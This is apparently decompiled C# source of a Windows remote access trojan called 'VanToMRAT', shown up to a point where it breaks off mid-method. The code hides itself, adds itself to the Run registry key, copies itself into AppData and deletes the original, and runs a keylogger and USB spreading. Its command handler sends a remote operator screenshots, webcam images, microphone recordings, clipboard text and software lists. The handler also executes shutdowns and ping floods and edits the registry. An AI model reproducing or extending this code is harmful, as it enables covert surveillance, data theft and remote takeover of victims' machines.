using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Media;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using cam;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using rec;
using Stub.My;

namespace Stub
{
	// Token: 0x02000030 RID: 48
	[DesignerGenerated]
	public partial class VanToMRAT : Form
	{
		// Token: 0x060000DE RID: 222 RVA: 0x00009C64 File Offset: 0x00007E64
		public VanToMRAT()
		{
			base.FormClosing += this.Form1_FormClosing;
			base.Load += this.Form1_Load;
			VanToMRAT.__ENCAddToList(this);
			this.rico = new rec();
			this.tm = false;
			this.kl = new njLogger();
			this.cap = new CRDP();
			this.caa = new CRDP1();
			this.tictoc = 0;
			this.id = "76487-337-8429955-22614";
			this.StartupKey = VanToMRAT.name;
			this.iwE = Environment.GetEnvironmentVariable("windir", EnvironmentVariableTarget.Machine);
			this.yY = "|VanToM|";
			this.c = new SocketClient();
			this.culture = CultureInfo.CurrentCulture.EnglishName;
			this.country = checked(this.culture.Substring(this.culture.IndexOf('(') + 1, this.culture.LastIndexOf(')') - this.culture.IndexOf('(') - 1));
			this.o = new njLogger();
			this.cam = new A();
			string text = "Shell_traywnd";
			string text2 = "";
			this.taskBar = VanToMRAT.FindWindow(ref text, ref text2);
			this.RegionA = "SELECT * FROM Win32_VideoController";
			this.Npc = Environment.UserName + "@" + Environment.MachineName;
			this.sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
			this.InitializeComponent();
		}

		// Token: 0x060000DF RID: 223 RVA: 0x00009DD8 File Offset: 0x00007FD8
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VanToMRAT.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VanToMRAT.__ENCList.Count == VanToMRAT.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int num2 = 0;
						int num3 = VanToMRAT.__ENCList.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = VanToMRAT.__ENCList[num4];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num4 != num;
								if (flag2)
								{
									VanToMRAT.__ENCList[num] = VanToMRAT.__ENCList[num4];
								}
								num++;
							}
							num4++;
						}
						VanToMRAT.__ENCList.RemoveRange(num, VanToMRAT.__ENCList.Count - num);
						VanToMRAT.__ENCList.Capacity = VanToMRAT.__ENCList.Count;
					}
					VanToMRAT.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x060000E2 RID: 226 RVA: 0x0000A064 File Offset: 0x00008264
		// (set) Token: 0x060000E3 RID: 227 RVA: 0x0000A080 File Offset: 0x00008280
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x060000E4 RID: 228 RVA: 0x0000A0E8 File Offset: 0x000082E8
		// (set) Token: 0x060000E5 RID: 229 RVA: 0x0000A104 File Offset: 0x00008304
		internal virtual System.Windows.Forms.Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer2 != null;
				if (flag)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				flag = (this._Timer2 != null);
				if (flag)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x060000E6 RID: 230 RVA: 0x0000A16C File Offset: 0x0000836C
		// (set) Token: 0x060000E7 RID: 231 RVA: 0x0000A188 File Offset: 0x00008388
		internal virtual System.Windows.Forms.Timer Timer3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Timer3 = value;
			}
		}

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x060000E8 RID: 232 RVA: 0x0000A194 File Offset: 0x00008394
		// (set) Token: 0x060000E9 RID: 233 RVA: 0x0000A1B0 File Offset: 0x000083B0
		internal virtual System.Windows.Forms.Timer Timer4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer4_Tick);
				bool flag = this._Timer4 != null;
				if (flag)
				{
					this._Timer4.Tick -= value2;
				}
				this._Timer4 = value;
				flag = (this._Timer4 != null);
				if (flag)
				{
					this._Timer4.Tick += value2;
				}
			}
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x060000EB RID: 235 RVA: 0x0000A280 File Offset: 0x00008480
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ClassStyle |= 512;
				return createParams;
			}
		}

		// Token: 0x060000EC RID: 236
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int ShowWindow(IntPtr handle, int nCmdShow);

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x060000ED RID: 237 RVA: 0x0000A2B0 File Offset: 0x000084B0
		// (set) Token: 0x060000EE RID: 238 RVA: 0x0000A2CC File Offset: 0x000084CC
		public virtual SocketClient c
		{
			[DebuggerNonUserCode]
			get
			{
				return this._c;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				SocketClient.DataEventHandler obj = new SocketClient.DataEventHandler(this.data);
				bool flag = this._c != null;
				if (flag)
				{
					this._c.Data -= obj;
				}
				this._c = value;
				flag = (this._c != null);
				if (flag)
				{
					this._c.Data += obj;
				}
			}
		}

		// Token: 0x060000EF RID: 239
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

		// Token: 0x060000F0 RID: 240
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x060000F1 RID: 241
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
		private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

		// Token: 0x060000F2 RID: 242
		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mciSendStringA", ExactSpelling = true, SetLastError = true)]
		public static extern long mciSendString([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString, long uReturnLength, long hwndCallback);

		// Token: 0x060000F3 RID: 243
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "BlockInput", ExactSpelling = true, SetLastError = true)]
		public static extern int apiBlockInput(int fBlock);

		// Token: 0x060000F4 RID: 244
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern long SwapMouseButton(long bSwap);

		// Token: 0x060000F5 RID: 245
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

		// Token: 0x060000F6 RID: 246
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

		// Token: 0x060000F7 RID: 247
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "FindWindowA", ExactSpelling = true, SetLastError = true)]
		private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

		// Token: 0x060000F8 RID: 248 RVA: 0x0000A334 File Offset: 0x00008534
		private string GetCaption()
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			IntPtr foregroundWindow = VanToMRAT.GetForegroundWindow();
			VanToMRAT.GetWindowText(foregroundWindow, stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString();
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0000A370 File Offset: 0x00008570
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x060000FA RID: 250 RVA: 0x0000A37C File Offset: 0x0000857C
		public void och()
		{
			MyProject.Forms.Form3.Show();
		}

		// Token: 0x060000FB RID: 251 RVA: 0x0000A390 File Offset: 0x00008590
		public void cc()
		{
			MyProject.Forms.Form3.Close();
		}

		// Token: 0x060000FC RID: 252 RVA: 0x0000A3A4 File Offset: 0x000085A4
		public void rvt(string data1)
		{
			TextBox recv = MyProject.Forms.Form3.Recv;
			string str;
			recv.Text = recv.Text + Environment.NewLine + data1 + str;
			MyProject.Forms.Form3.Recv.SelectionStart = MyProject.Forms.Form3.Recv.Text.Length;
			MyProject.Forms.Form3.Recv.ScrollToCaret();
		}

		// Token: 0x060000FD RID: 253 RVA: 0x0000A420 File Offset: 0x00008620
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Form1_Load(object sender, EventArgs e)
		{
			this.Timer4.Start();
			this.alab = A.GT();
			FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
			checked
			{
				this.text1 = Strings.Space((int)FileSystem.LOF(1));
				this.text2 = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref this.text1, -1L, false);
				FileSystem.FileGet(1, ref this.text2, -1L, false);
				FileSystem.FileClose(new int[0]);
				this.dzd = Strings.Split(this.text1, "abccba", -1, CompareMethod.Binary);
				this.kl.Start();
				this.Hide();
				this.Visible = false;
				this.ShowInTaskbar = false;
				this.Timer1.Start();
				VanToMRAT.name = VanToMRAT.vicname + "_" + this.HWD();
				bool flag = Conversions.ToBoolean(VanToMRAT.usb);
				if (flag)
				{
					USB usb = new USB();
					usb.Start();
				}
				try
				{
					string text = VanToMRAT.namev;
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true);
					registryKey.SetValue(text, Application.ExecutablePath, RegistryValueKind.String);
					registryKey.Close();
				}
				catch (Exception ex)
				{
				}
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				bool flag2;
				try
				{
					flag = Operators.ConditionalCompareObjectEqual(VanToMRAT.dta, true, false);
					if (flag)
					{
						Directory.CreateDirectory(folderPath + "\\" + VanToMRAT.flder);
						flag = (Operators.CompareString(Application.ExecutablePath, string.Concat(new string[]
						{
							Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
							"\\",
							VanToMRAT.flder,
							"\\",
							VanToMRAT.namev,
							".exe"
						}), false) == 0);
						if (flag)
						{
							flag2 = File.Exists(Path.GetTempPath() + "melt.txt");
							if (flag2)
							{
							}
						}
						else
						{
							flag2 = File.Exists(Path.GetTempPath() + "melt.txt");
							if (flag2)
							{
								try
								{
									File.Delete(Path.GetTempPath() + "melt.txt");
								}
								catch (Exception ex2)
								{
								}
							}
							flag2 = File.Exists(string.Concat(new string[]
							{
								Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
								"\\",
								VanToMRAT.flder,
								"\\",
								VanToMRAT.namev,
								".exe"
							}));
							if (flag2)
							{
								try
								{
									File.Delete(string.Concat(new string[]
									{
										Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
										"\\",
										VanToMRAT.flder,
										"\\",
										VanToMRAT.namev,
										".exe"
									}));
								}
								catch (Exception ex3)
								{
								}
								File.Copy(Application.ExecutablePath, string.Concat(new string[]
								{
									Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
									"\\",
									VanToMRAT.flder,
									"\\",
									VanToMRAT.namev,
									".exe"
								}));
								File.WriteAllText(Path.GetTempPath() + "melt.txt", Application.ExecutablePath);
								Process.Start(string.Concat(new string[]
								{
									Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
									"\\",
									VanToMRAT.flder,
									"\\",
									VanToMRAT.namev,
									".exe"
								}));
							}
							else
							{
								File.Copy(Application.ExecutablePath, string.Concat(new string[]
								{
									Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
									"\\",
									VanToMRAT.flder,
									"\\",
									VanToMRAT.namev,
									".exe"
								}));
								File.WriteAllText(Path.GetTempPath() + "melt.txt", Application.ExecutablePath);
								Process.Start(string.Concat(new string[]
								{
									Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
									"\\",
									VanToMRAT.flder,
									"\\",
									VanToMRAT.namev,
									".exe"
								}));
								ProjectData.EndApp();
							}
						}
					}
				}
				catch (Exception ex4)
				{
				}
				flag2 = Conversions.ToBoolean(VanToMRAT.melt);
				if (flag2)
				{
					Directory.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(folderPath + "\\", this.tcs)));
					flag2 = Operators.ConditionalCompareObjectEqual(Application.ExecutablePath, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", this.tcs), "\\"), VanToMRAT.namev), false);
					if (flag2)
					{
						flag = File.Exists(Path.GetTempPath() + "melt.txt");
						if (flag)
						{
						}
					}
					else
					{
						flag2 = File.Exists(Path.GetTempPath() + "melt.txt");
						if (flag2)
						{
							try
							{
								File.Delete(Path.GetTempPath() + "melt.txt");
							}
							catch (Exception ex5)
							{
							}
						}
						flag2 = File.Exists(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", this.tcs), "\\"), VanToMRAT.namev)));
						if (flag2)
						{
							try
							{
								File.Delete(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", this.tcs), "\\"), VanToMRAT.namev)));
							}
							catch (Exception ex6)
							{
							}
							File.Copy(Application.ExecutablePath, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", this.tcs), "\\"), VanToMRAT.namev)));
							File.WriteAllText(Path.GetTempPath() + "melt.txt", Application.ExecutablePath);
							NewLateBinding.LateCall(null, typeof(Process), "Start", new object[]
							{
								Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", this.tcs), "\\"), VanToMRAT.namev)
							}, null, null, null, true);
						}
						else
						{
							File.Copy(Application.ExecutablePath, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", this.tcs), "\\"), VanToMRAT.namev)));
							File.WriteAllText(Path.GetTempPath() + "melt.txt", Application.ExecutablePath);
							NewLateBinding.LateCall(null, typeof(Process), "Start", new object[]
							{
								Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", this.tcs), "\\"), VanToMRAT.namev)
							}, null, null, null, true);
							ProjectData.EndApp();
						}
					}
				}
				flag2 = Conversions.ToBoolean(VanToMRAT.melt);
				if (flag2)
				{
					flag = File.Exists(Path.GetTempPath() + "melt.txt");
					if (flag)
					{
						try
						{
							File.Delete(File.ReadAllText(Path.GetTempPath() + "melt.txt"));
						}
						catch (Exception ex7)
						{
						}
					}
				}
				else
				{
					flag2 = File.Exists(Path.GetTempPath() + "melt.txt");
					if (flag2)
					{
						try
						{
							File.Delete(Path.GetTempPath() + "melt.txt");
						}
						catch (Exception ex8)
						{
						}
					}
				}
			}
		}

		// Token: 0x060000FE RID: 254 RVA: 0x0000AD50 File Offset: 0x00008F50
		public string gtx()
		{
			string text = Clipboard.GetText();
			this.c.Send("recvcli" + this.yY + text);
			return Conversions.ToString(true);
		}

		// Token: 0x060000FF RID: 255 RVA: 0x0000AD90 File Offset: 0x00008F90
		public RegistryKey GetKey(string key)
		{
			bool flag = key.StartsWith(Registry.ClassesRoot.Name);
			RegistryKey result;
			if (flag)
			{
				string text = key.Replace(Registry.ClassesRoot.Name + "\\", "");
				result = Registry.ClassesRoot.OpenSubKey(text, true);
			}
			else
			{
				flag = key.StartsWith(Registry.CurrentUser.Name);
				if (flag)
				{
					string text = key.Replace(Registry.CurrentUser.Name + "\\", "");
					result = Registry.CurrentUser.OpenSubKey(text, true);
				}
				else
				{
					flag = key.StartsWith(Registry.LocalMachine.Name);
					if (flag)
					{
						string text = key.Replace(Registry.LocalMachine.Name + "\\", "");
						result = Registry.LocalMachine.OpenSubKey(text, true);
					}
					else
					{
						flag = key.StartsWith(Registry.Users.Name);
						if (flag)
						{
							string text = key.Replace(Registry.Users.Name + "\\", "");
							result = Registry.Users.OpenSubKey(text, true);
						}
						else
						{
							result = null;
						}
					}
				}
			}
			return result;
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0000AED0 File Offset: 0x000090D0
		public Image CaptureDesktop()
		{
			Image result;
			try
			{
				Rectangle rectangle = default(Rectangle);
				rectangle = Screen.PrimaryScreen.Bounds;
				Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
				result = bitmap;
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000AF74 File Offset: 0x00009174
		public string xSTCWkAgg()
		{
			string str = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\";
			string text = "";
			foreach (string str2 in Registry.LocalMachine.OpenSubKey(str).GetSubKeyNames())
			{
				string str3 = Conversions.ToString(Registry.LocalMachine.OpenSubKey(str + str2 + "\\").GetValue("DisplayName"));
				text = text + str3 + "Splitplogmanager";
			}
			return text;
		}

		// Token: 0x06000102 RID: 258 RVA: 0x0000AFFC File Offset: 0x000091FC
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void data(byte[] b)
		{
			string text = Module1.BS(b);
			string expression = Module1.BS(b);
			string[] array = Strings.Split(Module1.BS(b), this.yY, -1, CompareMethod.Binary);
			string text2 = "lv" + this.yY;
			string[] array2 = Strings.Split(expression, this.yY, -1, CompareMethod.Binary);
			string[] array3 = Strings.Split(Module1.BS(b), "||", -1, CompareMethod.Binary);
			string[] array4 = Strings.Split(expression, this.yY, -1, CompareMethod.Binary);
			checked
			{
				try
				{
					string left = array[0];
					bool flag = Operators.CompareString(left, "Info", false) == 0;
					if (flag)
					{
						string text3 = MyProject.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
						string text4 = Environment.MachineName + "/" + Environment.UserName;
						this.c.Send(string.Concat(new string[]
						{
							"Info",
							this.yY,
							VanToMRAT.name,
							this.yY,
							this.country,
							this.yY,
							text3,
							this.GenerateOperatingSystem(),
							this.yY,
							Module1.checkcam(),
							this.yY
						}));
					}
					else
					{
						flag = (Operators.CompareString(left, "infoDesk", false) == 0);
						if (flag)
						{
							Image value = this.CaptureDesktop();
							ImageConverter imageConverter = new ImageConverter();
							byte[] inArray = (byte[])imageConverter.ConvertTo(value, b.GetType());
							this.c.Send("infoDesk|VanToM|" + Convert.ToBase64String(inArray));
						}
						else
						{
							flag = (Operators.CompareString(left, "startrec", false) == 0);
							if (flag)
							{
								this.rico.startrec();
								while (MyProject.Computer.FileSystem.FileExists(Path.GetTempPath() + "soundrec" + Conversions.ToString(this.tictoc) + ".wav"))
								{
									this.tictoc++;
								}
							}
							else
							{
								flag = (Operators.CompareString(left, "stoprec", false) == 0);
								if (flag)
								{
									this.rico.stoprec();
									this.c.Send("downloadtherec" + this.yY + Convert.ToBase64String(File.ReadAllBytes(Path.GetTempPath() + "soundrec" + Conversions.ToString(this.tictoc) + ".wav")));
								}
								else
								{
									flag = (Operators.CompareString(left, "requestrecords", false) == 0);
									if (flag)
									{
										this.c.Send("requestrecords");
									}
									else
									{
										flag = (Operators.CompareString(left, "oprog", false) == 0);
										if (flag)
										{
											this.c.Send("oprog" + this.yY + this.dzd[1]);
										}
										else
										{
											flag = (Operators.CompareString(left, "iprog", false) == 0);
											if (flag)
											{
												this.c.Send("iprog" + this.yY + this.xSTCWkAgg());
											}
											else
											{
												flag = (Operators.CompareString(left, "Logoff", false) == 0);
												if (flag)
												{
													Interaction.Shell("shutdown -l -t 00", AppWinStyle.Hide, false, -1);
												}
												else
												{
													flag = (Operators.CompareString(left, "Restart", false) == 0);
													if (flag)
													{
														Interaction.Shell("shutdown -r -t 00", AppWinStyle.Hide, false, -1);
													}
													else
													{
														flag = (Operators.CompareString(left, "Shutdown", false) == 0);
														if (flag)
														{
															Interaction.Shell("shutdown -s -t 00", AppWinStyle.Hide, false, -1);
														}
														else
														{
															flag = (Operators.CompareString(left, "Quran", false) == 0);
															if (flag)
															{
																Process.Start("http://im36.gulfup.com/Gb0cY.swf");
															}
															else
															{
																flag = (Operators.CompareString(left, "ControlCenter", false) == 0);
																if (flag)
																{
																	this.c.Send("ControlCenter");
																}
																else
																{
																	flag = (Operators.CompareString(left, "opentto", false) == 0);
																	if (flag)
																	{
																		this.c.Send("opentto");
																	}
																	else
																	{
																		flag = (Operators.CompareString(left, "att", false) == 0);
																		if (flag)
																		{
																			Interaction.Shell("ping -t" + array4[1] + "-l " + array4[2], AppWinStyle.Hide, false, -1);
																		}
																		else
																		{
																			flag = (Operators.CompareString(left, "camlist", false) == 0);
																			if (flag)
																			{
																				try
																				{
																					string text5 = "camlist";
																					foreach (string str in this.cam.Divs())
																					{
																						text5 = text5 + this.yY + str;
																					}
																					this.c.Send(text5);
																				}
																				catch (Exception ex)
																				{
																				}
																			}
																			else
																			{
																				flag = (Operators.CompareString(left, "cam", false) == 0);
																				if (flag)
																				{
																					string text6 = "cam";
																					flag = ((double)this.cam.Drive != Conversions.ToDouble(array4[1]));
																					if (flag)
																					{
																						A a = this.cam;
																						int i2 = Conversions.ToInteger(array4[1]);
																						Size siz = new Size(160, 120);
																						a.onn(i2, siz);
																						this.c.Send(text6);
																					}
																					else
																					{
																						flag = (this.cam.M != null);
																						if (flag)
																						{
																							object objectValue = RuntimeHelpers.GetObjectValue(this.cam.M.Clone());
																							ImageConverter imageConverter2 = new ImageConverter();
																							byte[] inArray2 = (byte[])imageConverter2.ConvertTo(RuntimeHelpers.GetObjectValue(objectValue), b.GetType());
																							this.c.Send(text6 + this.yY + Convert.ToBase64String(inArray2));
																						}
																						else
																						{
																							this.c.Send(text6);
																						}
																					}
																				}
																				else
																				{
																					flag = (Operators.CompareString(left, "camclose", false) == 0);
																					if (flag)
																					{
																						this.cam.close();
																					}
																					else
																					{
																						flag = (Operators.CompareString(left, "openRG", false) == 0);
																						if (flag)
																						{
																							this.c.Send("openRG");
																						}
																						else
																						{
																							flag = (Operators.CompareString(left, "RG", false) == 0);
																							if (flag)
																							{
																								object key = this.GetKey(array4[2]);
																								string left2 = array4[1];
																								flag = (Operators.CompareString(left2, "~", false) == 0);
																								if (flag)
																								{
																									string str2 = string.Concat(new string[]
																									{
																										"RG",
																										this.yY,
																										"~",
																										this.yY,
																										array4[2],
																										this.yY
																									});
																									string text7 = "";
																									try
																									{
																										foreach (object value2 in ((IEnumerable)NewLateBinding.LateGet(key, null, "GetSubKeyNames", new object[0], null, null, null)))
																										{
																											string text8 = Conversions.ToString(value2);
																											flag = !text8.Contains("\\");
																											if (flag)
																											{
																												text7 = text7 + text8 + this.yY;
																											}
																										}
																									}
																									finally
																									{
																										IEnumerator enumerator;
																										flag = (enumerator is IDisposable);
																										if (flag)
																										{
																											(enumerator as IDisposable).Dispose();
																										}
																									}
																									try
																									{
																										foreach (object value3 in ((IEnumerable)NewLateBinding.LateGet(key, null, "GetValueNames", new object[0], null, null, null)))
																										{
																											string text9 = Conversions.ToString(value3);
																											string[] array6 = new string[7];
																											array6[0] = text7;
																											array6[1] = text9;
																											array6[2] = "/";
																											string[] array7 = array6;
																											int num = 3;
																											object instance = key;
																											Type type = null;
																											string memberName = "GetValueKind";
																											object[] array8 = new object[]
																											{
																												text9
																											};
																											object[] arguments = array8;
																											string[] argumentNames = null;
																											Type[] typeArguments = null;
																											bool[] array9 = new bool[]
																											{
																												true
																											};
																											object obj = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array9);
																											if (array9[0])
																											{
																												text9 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
																											}
																											array7[num] = obj.ToString();
																											array6[4] = "/";
																											string[] array10 = array6;
																											int num2 = 5;
																											object instance2 = key;
																											Type type2 = null;
																											string memberName2 = "GetValue";
																											object[] array11 = new object[]
																											{
																												text9,
																												""
																											};
																											object[] arguments2 = array11;
																											string[] argumentNames2 = null;
																											Type[] typeArguments2 = null;
																											bool[] array12 = new bool[]
																											{
																												true,
																												false
																											};
																											object obj2 = NewLateBinding.LateGet(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array12);
																											if (array12[0])
																											{
																												text9 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array11[0]), typeof(string));
																											}
																											array10[num2] = obj2.ToString();
																											array6[6] = this.yY;
																											text7 = string.Concat(array6);
																										}
																									}
																									finally
																									{
																										IEnumerator enumerator2;
																										flag = (enumerator2 is IDisposable);
																										if (flag)
																										{
																											(enumerator2 as IDisposable).Dispose();
																										}
																									}
																									this.c.Send(str2 + text7);
																								}
																								else
																								{
																									flag = (Operators.CompareString(left2, "!", false) == 0);
																									if (flag)
																									{
																										object instance3 = key;
																										Type type3 = null;
																										string memberName3 = "SetValue";
																										object[] array8 = new object[3];
																										object[] array13 = array8;
																										int num3 = 0;
																										string[] array6 = array4;
																										string[] array14 = array6;
																										int num4 = 3;
																										array13[num3] = array14[num4];
																										object[] array15 = array8;
																										int num5 = 1;
																										string[] array16 = array4;
																										string[] array17 = array16;
																										int num6 = 4;
																										array15[num5] = array17[num6];
																										object[] array18 = array8;
																										int num7 = 2;
																										string[] array19 = array4;
																										string[] array20 = array19;
																										int num8 = 5;
																										array18[num7] = array20[num8];
																										object[] array21 = array8;
																										object[] arguments3 = array21;
																										string[] argumentNames3 = null;
																										Type[] typeArguments3 = null;
																										bool[] array9 = new bool[]
																										{
																											true,
																											true,
																											true
																										};
																										NewLateBinding.LateCall(instance3, type3, memberName3, arguments3, argumentNames3, typeArguments3, array9, true);
																										if (array9[0])
																										{
																											array6[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array21[0]), typeof(string));
																										}
																										if (array9[1])
																										{
																											array16[num6] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array21[1]), typeof(string));
																										}
																										if (array9[2])
																										{
																											array19[num8] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array21[2]), typeof(string));
																										}
																									}
																									else
																									{
																										flag = (Operators.CompareString(left2, "@5", false) == 0);
																										if (flag)
																										{
																											object instance4 = key;
																											Type type4 = null;
																											string memberName4 = "DeleteValue";
																											object[] array8 = new object[2];
																											object[] array22 = array8;
																											int num9 = 0;
																											string[] array19 = array4;
																											string[] array23 = array19;
																											int num8 = 3;
																											array22[num9] = array23[num8];
																											array8[1] = false;
																											object[] array21 = array8;
																											object[] arguments4 = array21;
																											string[] argumentNames4 = null;
																											Type[] typeArguments4 = null;
																											bool[] array9 = new bool[]
																											{
																												true,
																												false
																											};
																											NewLateBinding.LateCall(instance4, type4, memberName4, arguments4, argumentNames4, typeArguments4, array9, true);
																											if (array9[0])
																											{
																												array19[num8] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array21[0]), typeof(string));
																											}
																										}
																										else
																										{
																											flag = (Operators.CompareString(left2, "#", false) == 0);
																											if (flag)
																											{
																												object instance5 = key;
																												Type type5 = null;
																												string memberName5 = "CreateSubKey";
																												object[] array8 = new object[1];
																												object[] array24 = array8;
																												int num10 = 0;
																												string[] array19 = array4;
																												string[] array25 = array19;
																												int num8 = 3;
																												array24[num10] = array25[num8];
																												object[] array21 = array8;
																												object[] arguments5 = array21;
																												string[] argumentNames5 = null;
																												Type[] typeArguments5 = null;
																												bool[] array9 = new bool[]
																												{
																													true
																												};
																												NewLateBinding.LateCall(instance5, type5, memberName5, arguments5, argumentNames5, typeArguments5, array9, true);
																												if (array9[0])
																												{
